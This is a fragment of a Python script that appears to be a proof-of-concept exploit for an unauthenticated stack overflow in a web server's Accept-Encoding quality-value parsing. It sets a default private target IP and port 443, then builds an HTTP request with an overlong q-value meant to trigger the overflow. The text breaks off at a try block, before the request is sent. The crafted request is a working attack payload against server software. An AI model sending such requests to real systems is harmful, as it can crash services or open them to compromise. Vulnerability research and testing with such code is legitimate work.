...
def main():
    parser = argparse.ArgumentParser(description='Unauthenticated stack overflow in Accept-Encoding quality parsing')
    parser.add_argument('--target', default='192.168.229.1')
    parser.add_argument('--port', type=int, default=443)
    args = parser.parse_args()
    request = 'GET / HTTP/1.1\r\nHost: {host}\r\nAccept-Encoding: gzip;q=777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777\r\nConnection: close\r\n\r\n'.format(host=args.target).encode()
    response = b''
    error = ''
    try:
